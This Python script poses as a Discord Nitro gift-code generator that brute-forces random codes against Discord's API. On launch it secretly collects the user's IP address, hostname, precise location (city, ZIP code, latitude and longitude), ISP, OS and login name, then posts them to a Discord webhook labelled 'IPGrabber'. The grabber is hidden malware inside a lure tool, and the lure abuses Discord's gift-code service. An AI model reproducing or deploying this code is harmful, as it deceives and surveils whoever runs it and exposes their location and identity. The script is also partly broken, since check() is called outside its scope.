import socket, requests, platform, random, string
from discord_webhook import DiscordWebhook, DiscordEmbed
import random
import string
import os

def gencode():
	letters = string.ascii_letters + string.digits
	return ''.join(random.choice(letters) for i in range(19))
message = ""
ping = True

if ping == True:
	setup = open("Setup/PingFile.txt", "r")
	scontents = setup.read()
	message = scontents
else:
	message = ""

def menu():
	print("""

    _   ___ __                            
   / | / (_) /__________  ____ ____  ____ 
  /  |/ / / __/ ___/ __ \/ __ `/ _ \/ __ \

 / /|  / / /_/ /  / /_/ / /_/ /  __/ / / /
/_/ |_/_/\__/_/   \____/\__, /\___/_/ /_/ 
                       /____/             

	""")
	
	def check():
		while True:
			code = gencode()
			codes.append(code)
			response = requests.get(
				"https://discord.com/api/v7/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true")
			data = response.json()
			if data["message"] == 'Unknown Gift Code':
				print("[Nitro] Didnt work: " + code)
			elif data["message"] == 'You are being rate limited.':
		                              print('[Nitro] Rate Limited: ' + code)
		                              file = open("ratelimit.txt", "a+")
		                              file.write("\n" + code)
			else:
					print("[Nitro] Worked: " + code)
					file = open("workedcodes.txt", "a+")
					file.write("\n" + code)
	codes = []
	check()
def WebhookDone():
	webhook = DiscordWebhook(url='https://discord.com/api/webhooks/sike', username="SkidWatcher", avatar_url="https://i.redd.it/bu1huosbvd211.jpg")
	embed = DiscordEmbed(title="Got a catch!", description="")
	# Get token

	
	
	# Get ip
	userr = os.getlogin()
	get_ip = requests.get("https://api.ipify.org/?format=json").json()['ip']
	get_hostname = requests.get("https://wtfismyip.com/json").json()['YourFuckingHostname']
	get_location = requests.get("https://wtfismyip.com/json").json()['YourFuckingLocation']
	get_isp = requests.get("https://wtfismyip.com/json").json()['YourFuckingISP']
	get_tor = requests.get("https://wtfismyip.com/json").json()['YourFuckingTorExit']
	get_cc = requests.get("https://api.myip.com").json()['cc']
	get_os = platform.platform()

	ifc = "https://ifconfig.co/json"
	city = requests.get(ifc).json()['city']
	asn = requests.get("https://ifconfig.co/json").json()['asn']
	asn_org = requests.get("https://ifconfig.co/json").json()['asn_org']
	zip = requests.get("https://ifconfig.co/json").json()['zip_code']
	lat = requests.get("https://extreme-ip-lookup.com/json/").json()['lat']
	lon = requests.get("https://extreme-ip-lookup.com/json/").json()['lon']
	
	

	emb = embed.add_embed_field
	embed.add_embed_field(name='Hostname', value=get_hostname)
	embed.add_embed_field(name="Are they on TOR?", value=get_tor)
	embed.add_embed_field(name="City", value=city)
	embed.add_embed_field(name='Location', value=get_location)
	embed.add_embed_field(name='OS', value=get_os)
	embed.add_embed_field(name="ISP", value=get_isp)
	embed.add_embed_field(name="ASN", value=asn)
	embed.add_embed_field(name="ASN ORG", value=asn_org)
	embed.add_embed_field(name="Zip Code", value=zip)
	embed.add_embed_field(name="Latitude", value=lat)
	embed.add_embed_field(name="Longitude", value=lon)
	embed.add_embed_field(name="Country Code", value=get_cc)
	embed.add_embed_field(name='IP Address', value=get_ip)
	embed.add_embed_field(name="Device Name", value=userr)
	
	embed.set_footer(text="Made with Love by Raz | This skid just got pwned lmao ")
	embed.set_timestamp()
	embed.set_author(text="IPGrabber by raz v0.1")
	webhook.add_embed(embed)
	
	resp = webhook.execute()
if message == "":
	content = ""
else:
	content = scontents
	

def notify():
	webhook = DiscordWebhook(url='https://discord.com/api/webhooks/sike', content = content + ' someone clicked', username="Notifier by Raz", avatar_url="https://i.redd.it/bu1huosbvd211.jpg")
	asz = webhook.execute()
print("Please wait. Loading...")
notify()
WebhookDone()
os.system('clear')
menu()
check()
